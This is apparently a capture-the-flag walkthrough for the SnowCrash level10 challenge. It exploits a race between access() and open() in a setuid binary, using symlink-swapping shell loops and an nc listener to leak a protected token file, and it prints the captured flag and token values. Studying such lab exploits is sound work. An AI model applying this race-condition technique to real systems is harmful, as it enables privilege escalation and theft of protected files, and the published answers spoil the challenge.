We see 2 files token and level10:
```
level10@SnowCrash:~$ ls -la
total 28
[...]
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```
We don't have access to the token, but we can run level10:
```
level10@SnowCrash:~$ ./level10 
./level10 file host
	sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token localhost
You don't have access to token
```
Let's try to transfer our file
```
level10@SnowCrash:~$ echo 'abc' > /tmp/myfile
level10@SnowCrash:~$ ./level10 /tmp/myfile localhost
Connecting to localhost:6969 .. Unable to connect to host localhost
```
In binary used function access():
```
level10@SnowCrash:~$ nm -u level10
         w _Jv_RegisterClasses
         U __errno_location@@GLIBC_2.0
         w __gmon_start__
         U __libc_start_main@@GLIBC_2.0
         U __stack_chk_fail@@GLIBC_2.4
         U access@@GLIBC_2.0
         U connect@@GLIBC_2.0
         U exit@@GLIBC_2.0
         U fflush@@GLIBC_2.0
         U htons@@GLIBC_2.0
         U inet_addr@@GLIBC_2.0
         U open@@GLIBC_2.0
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
         U read@@GLIBC_2.0
         U socket@@GLIBC_2.0
         U strerror@@GLIBC_2.0
         U write@@GLIBC_2.0
```
```
level10@SnowCrash:~$ man 2 access
[...]
NOTES
       Warning:   Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because
       the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be
       avoided.   (In  the  example  just  described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call
       open(2).)
[...]
```
It means that a malicious user could substitute a file he has access to for a
symlink to something he doesn't have access to between the access() and
the open() calls. 

Let's save script substitute to file `/tmp/substitute.sh`, and run it
```
#!/bin/sh
while true;
    do
        ln -fs ~/token /tmp/link;
        ln -fs ~/level10 /tmp/link;
    done
```
In another tab of terminal make and run listen.sh script file `/tmp/substitute.sh`
(we try to use localhost, but it not worked)
```
#!/bin/sh
while true;
    do
        ./level10 /tmp/link 192.168.1.88; #our VM ip
    done
```
And now lets listen on 6969 port in third terminal window:
```
level10@SnowCrash:~$ nc -lk 6969
[...]
woupa2yuojeeaaed06riuj63c
[...]
```
it's flag password!

token: 'feulo4b72j7edeahuete3no7c'